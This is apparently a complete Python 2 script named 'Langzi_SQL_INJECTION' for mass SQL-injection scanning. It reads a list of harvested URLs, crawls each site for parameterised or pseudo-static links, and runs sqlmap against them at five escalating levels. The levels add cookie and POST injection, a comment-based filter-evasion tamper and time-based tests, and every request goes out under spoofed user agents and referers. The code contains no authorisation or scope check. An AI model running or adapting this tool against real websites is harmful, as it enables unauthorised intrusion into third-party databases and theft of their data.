# coding:utf-8
import subprocess
import os
import random
import re
import requests
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

os_python = os.path.join(os.getcwd(),'lib\python.exe')
os_sqlmap = os.path.join(os.getcwd(),'lib\sqlmap\\')
os_run = os_python + ' ' + os_sqlmap

#
# def writedata(x):
#     with open('log.txt','a+')as aa:
#         aa.write('------------------------------------' + '\n')
#         aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ',time.localtime())) + x + '\n')

REFERERS = [
    "https://www.baidu.com",
    "http://www.baidu.com",
    "https://www.google.com.hk",
    "http://www.so.com",
    "http://www.sogou.com",
    "http://www.soso.com",
    "http://www.bing.com",
]

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

headers = {
    'User-Agent': random.choice(headerss),
    'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'referer': random.choice(REFERERS),
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
}


def get_links(url):
    '''
    需要的有常规的注入点
        1. category.php?id=17
        2. https://www.yamibuy.com/cn/brand.php?id=566
    伪静态
        1. info/1024/4857.htm
        2. http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
    :param url:
    :return:
    '''
    domain = url.split('//')[1].strip('/').replace('www.', '')
    result = []
    id_links = []
    html_links = []
    result_links = {}
    html_links_s = []
    idid = []
    htht = []
    try:
        headers = {
            'User-Agent': random.choice(headerss),
            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'max-age=0',
            'referer': random.choice(REFERERS),
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        }
        rxww = requests.get(url, headers=headers, timeout=5).content
        soup = BeautifulSoup(rxww, 'html.parser')
        links = soup.findAll('a')
        for link in links:
            _url = link.get('href')
            res = re.search('(javascript|:;|#)', str(_url))
            res1 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt|db)', str(_url))
            if res == None and res1 == None:
                result.append(str(_url))
            else:
                pass
        if result != []:
            rst = list(set(result))
            for rurl in rst:
                if '//' in rurl and 'http' in rurl:
                    # https://www.yamibuy.com/cn/search.php?tags=163
                    # http://news.hnu.edu.cn/zhyw/2017-11-11/19605.html
                    if domain in rurl:
                        if '?' in rurl and '=' in rurl:
                            # result_links.append(rurl)
                            id_links.append(rurl)
                        if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                            if '?' not in rurl:
                                # result_links.append(rurl)
                                html_links.append(rurl)

                else:
                    # search.php?tags=163
                    if '?' in rurl and '=' in rurl:
                        # result_links.append(url + '/' + rurl)
                        id_links.append(url + '/' + rurl)
                    if '.html' in rurl or '.shtml' in rurl or '.htm' in rurl or '.shtm' in rurl:
                        # result_links.append(url + '/' + rurl)
                        if '?' not in rurl:
                            html_links.append(url + '/' + rurl)

            for x1 in html_links:
                try:
                    rx1 = requests.head(url=x1, headers=headers, timeout=5).status_code
                    if rx1 == 200:
                        htht.append(x1)
                except:
                    pass
            for x2 in id_links:
                try:
                    rx2 = requests.head(url=x2, headers=headers, timeout=5).status_code
                    if rx2 == 200:
                        idid.append(x2)
                except:
                    pass

            if htht == []:
                pass
            else:
                for x in htht:
                    if x.count('/') > 3:
                        ra = re.search('.*?/[0-9]\.', x)
                        if ra == None:
                            pass
                        else:
                            html_links_s.append(x)
                        if html_links_s == []:
                            html_links_s.append(random.choice(htht))

                if html_links_s == []:
                    result_links['html_links'] = random.choice(htht)
                else:
                    result_links['html_links'] = random.choice(html_links_s)

            if idid == []:
                pass
            else:
                result_links['id_links'] = random.choice(idid)
        if result_links == {}:
            return None
        else:
            return result_links
    except Exception, e:
        pass
    return None


def check(result,url,common):
    results = ''
    url = url.replace('^','')
    if '---' in result:
        try:
            result_info = re.search('---(.*?)---.*?INFO\] (.*?)\[',result,re.S)
            inj = str(result_info.group(1))
            dbs = str(result_info.group(2))
            results = '注入网址 : ' + url + '\n' + '执行命令 : ' + common + '\n' + inj.replace('Parameter: ','注入参数(方式) : ').replace('Type: ','注入方式 : ').replace('Title: ','注入标题 : ').replace('Payload: ','注入攻击 : ') + '\n'
            if 'back-end DBMS' in dbs:
                results = results + (dbs.replace('the back-end DBMS is ','数据库 : ').replace('web server operating system: ','服务器 : ').replace('web application technology: ','服务器语言 : ').replace('back-end DBMS: ','数据库版本 : ') + '\n')
            else:
                results = results + ('存在注入但可能被拦截' + '\n')
        except Exception,e:
            pass
            # writedata('EEEEERRRROOOORRRRR:' + str(e) + '\n')
    if results == '':
        return None
    else:
        return results


def scan_level_1(url):
    sql_result = None
    url = url.replace('&','^&')
    comm = os_run + 'sqlmap.py -u %s --batch --thread=10 --random-agent' % url
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        sql_result = check(result,url=url,common=comm)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_result == None:
            return None
        else:
            return sql_result



def scan_level_2(url):
    sql_result = None
    urls,datas = url.split('?')[0],url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --batch --thread=10 --random-agent".format(urls,datas)
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --batch --thread=10 --random-agent".format(urls,datas)

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        sql_result = check(result,url=url,common=comm_cookie)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_result != None:
            return sql_result

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        check(result,url=url,common=comm_post)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_result != None:
            return sql_result
        else:
            return None



def scan_level_3(url):
    sql_result = None
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % url
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        sql_result = check(result,url=url,common=comm)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_result == None:
            return None
        else:
            return sql_result

def scan_level_4(url):
    sql_result = None
    urls,datas = url.split('?')[0],url.split('?')[1]
    urls = urls.replace('&', '^&')
    datas = datas.replace('&', '^&')
    comm_cookie = os_run + "sqlmap.py -u {} --cookie {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(urls,datas)
    comm_post = os_run + "sqlmap.py -u {} --data {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(urls,datas)
    

    try:
        res = subprocess.Popen(comm_cookie, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        sql_result = check(result,url=url,common=comm_cookie)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_result != None:
            return sql_result

    try:
        res = subprocess.Popen(comm_post, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        check(result,url=url,common=comm_post)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_result == None:
            return None
        else:
            return sql_result



def scan_level_5(url):
    # 获取完整注入url即可
    sql_reqslt = None
    url = url.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(url)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        sql_reqslt = check(result,url=url,common=comm)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_reqslt == None:
            return None
        else:
            return sql_reqslt


def scan_html(url):
    sql_result = None
    urlse = url.replace('.htm','*.htm').replace('.shtm','*.shtm')
    urls = urlse.replace('&', '^&')
    comm = os_run + 'sqlmap.py -u {} --batch --thread=10 --random-agent'.format(urls)

    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read()
        sql_result = check(result,url=urls,common=comm)
    except Exception, e:
        pass
    finally:
        res.terminate()
        if sql_result == None:
            return None
        else:
            return sql_result

def get_url_sql(url,level=1):
    link = get_links(url)
    if link == None:
        pass
    else:
        if 'html_links' in link.keys():
            scan_html(link['html_links'])
        if 'id_links' in link.keys():
            if level == 1:
                scan_level_1(link['id_links'])
            if level == 2:
                scan_level_2(link['id_links'])
            if level == 3:
                scan_level_3(link['id_links'])
            if level == 4:
                scan_level_4(link['id_links'])
            if level == 5:
                scan_level_5(link['id_links'])
            if level == 6:
                dix1 = scan_level_1(link['id_links'])
                if dix1 != None:
                    return dix1
                dix2 = scan_level_2(link['id_links'])
                if dix2 != None:
                    return dix2
                dix3 = scan_level_3(link['id_links'])
                if dix3 != None:
                    return dix3
                dix4 = scan_level_4(link['id_links'])
                if dix4 != None:
                    return dix4
                dix5 = scan_level_5(link['id_links'])
                if dix5 != None:
                    return dix5



if __name__ == '__main__':
    multiprocessing.freeze_support()
    print ('''

             _                           _ 
            | |                         (_)
            | |     __ _ _ __   __ _ _____ 
            | |    / _` | '_ \ / _` |_  / |
            | |___| (_| | | | | (_| |/ /| |
            |______\__,_|_| |_|\__, /___|_|
                                __/ |      Langzi_SQL_INJECTION
                               |___/       Version:3.2
                                           Datetime:2018-11-19-13:05:36

    ''')
    New_start = raw_input(unicode('把采集的url文本拖拽进来:', 'utf-8').encode('gbk'))
    levels = int(raw_input(unicode('设置扫描等级(1/2/3/4/5/6):', 'utf-8').encode('gbk')))
    countss = int(raw_input(unicode('设置扫描进程数(2-36):', 'utf-8').encode('gbk')))
    p = multiprocessing.Pool(countss)
    list_ = list(set(
                [x.replace('\n', '') if x.startswith('http') else 'http://' + x.replace('\n', '') for x in
                 open(New_start, 'r').readlines()]))
    for x in list_:
        #p.apply(get_url_sql, args=(x, levels))
        p.apply_async(get_url_sql, args=(x, levels))
    p.close()
    p.join()
